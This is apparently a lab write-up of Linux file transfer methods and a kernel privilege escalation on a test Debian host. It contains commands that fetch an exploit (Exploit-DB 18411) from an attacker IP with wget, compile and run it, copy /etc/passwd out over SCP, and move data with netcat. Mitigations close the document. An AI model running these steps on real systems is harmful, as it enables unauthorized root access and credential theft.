# File Transfer Techniques & Privilege Escalation

**Author:** Farouq Hassan
**Attacker Machine:** Kali Linux (`192.168.1.15`)
**Target Machine:** Debian (`192.168.1.17`)
**Lab Type:** Controlled Privilege Escalation Exercise

📄 Source: 

---

# Part 1 — File Transfer Methods

This lab demonstrates multiple file transfer techniques between Kali and a target Linux system.

---

# 1️⃣ HTTP File Transfer (Python HTTP Server)

## Step 1 — Start HTTP Server on Kali

On attacker machine:

```bash
python3 -m http.server 8888
```

This starts a web server listening on:

```
http://0.0.0.0:8888/
```

As shown in the screenshot on page 1, the server logs:

```
Serving HTTP on 0.0.0.0 port 8888 ...
GET /linpeas.sh HTTP/1.0" 200 -
```

---

## Step 2 — Download File on Target

On target machine:

```bash
wget http://192.168.1.15:8888/linpeas.sh
```

Initial attempt to wrong port (`8000`) returned:

```
404 File not found
```

Second attempt to correct port (`8888`) returned:

```
200 OK
Saving to: ‘linpeas.sh’
```

File successfully downloaded (confirmed in page 1 screenshot ).

---

## Step 3 — Make Executable & Run

```bash
chmod +x linpeas.sh
./linpeas.sh
```

Confirmed in screenshot on page 2.

---

# 2️⃣ SCP File Transfer

Used SCP with legacy SSH options due to algorithm compatibility issues.

Command executed:

```bash
scp -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.1.17:/etc/passwd .
```

Explanation:

* `-oHostKeyAlgorithms=+ssh-rsa` → allows deprecated RSA host key
* `-oPubkeyAcceptedAlgorithms=+ssh-rsa` → accepts older SSH key algorithms
* Downloads `/etc/passwd` from target

As shown on page 2 .

---

# 3️⃣ Netcat File Transfer

## On Target Machine:

```bash
nc -lvp 4444 > test.txt
```

This listens on port 4444 and writes incoming data to `test.txt`.

Terminal shows:

```
listening on [any] 4444 ...
connect to [192.168.1.17] ...
```

---

## On Kali Machine:

```bash
echo "hello from kali" | nc 192.168.1.17 4444
```

---

## Verification on Target

```bash
cat test.txt
```

Output:

```
hello from kali
```

Confirmed in screenshot on page 2 .

---

# 4️⃣ Base64 File Transfer

Used when direct transfer methods are restricted.

---

## Encode on Kali

```bash
echo "hello-base64" | base64
```

Output shown on page 3:

```
aGVsbG8tYmFzZTY0Cg==
```

---

## Decode on Target

```bash
echo "aGVsbG8tYmFzZTY0Cg==" | base64 -d > b64.txt
```

File recreated successfully.

---

# Part 2 — Privilege Escalation Exploration

---

# Step 1 — Enumerate System Information

Checked kernel version:

```bash
uname -a
```

Output revealed vulnerable kernel:

```
Linux 2.6.32
```

Confirmed on page 3 .

---

# Step 2 — Run linpeas.sh

Executed:

```bash
./linpeas.sh
```

Result:

* Identified vulnerable kernel version `2.6.32`.

---

# Step 3 — Search for Kernel Exploits

On Kali:

```bash
searchsploit 2.6.32
```

Found multiple exploits.

Selected exploit:

```bash
searchsploit -m 18411
```

Exploit copied locally.

Shown in screenshot page 3 .

---

# Step 4 — Transfer Exploit to Target

Using HTTP server:

On Kali:

```bash
python3 -m http.server 8888
```

On target:

```bash
wget http://192.168.1.15:8888/18411.c
```

Confirmed successful download (page 4 screenshot ).

---

# Step 5 — Compile Exploit

On target:

```bash
gcc 18411.c -o exploit
```

Binary created successfully.

---

# Step 6 — Execute Exploit

```bash
./exploit
```

Exploit output displayed:

```
Mempodipper
by zx2c4
Jan 21, 2012
```

Followed by:

```
Executing child from child fork.
Opening parent mem /proc/2687/mem in child.
Reading su for exit@plt.
Executing su with shellcode.
```

As shown in page 4 screenshot .

---

# Result

* Identified vulnerable kernel (2.6.32)
* Located exploit (Exploit-DB ID 18411)
* Successfully compiled exploit
* Executed local privilege escalation attempt

---

# Skills Demonstrated

* Multiple Linux file transfer techniques
* HTTP file hosting
* SCP with legacy SSH configuration
* Netcat file streaming
* Base64 encoding/decoding
* Kernel enumeration
* Searchsploit usage
* Manual exploit compilation
* Local privilege escalation methodology

---

# Security Issues Identified

1. Outdated kernel (2.6.32)
2. No patch management
3. Exploit publicly available
4. Lack of hardening
5. Potential privilege escalation to root

---

# Recommended Mitigations

* Upgrade kernel immediately
* Disable compiler on production systems
* Restrict outbound HTTP requests
* Implement application whitelisting
* Use kernel hardening mechanisms
* Deploy EDR monitoring for exploit behavior
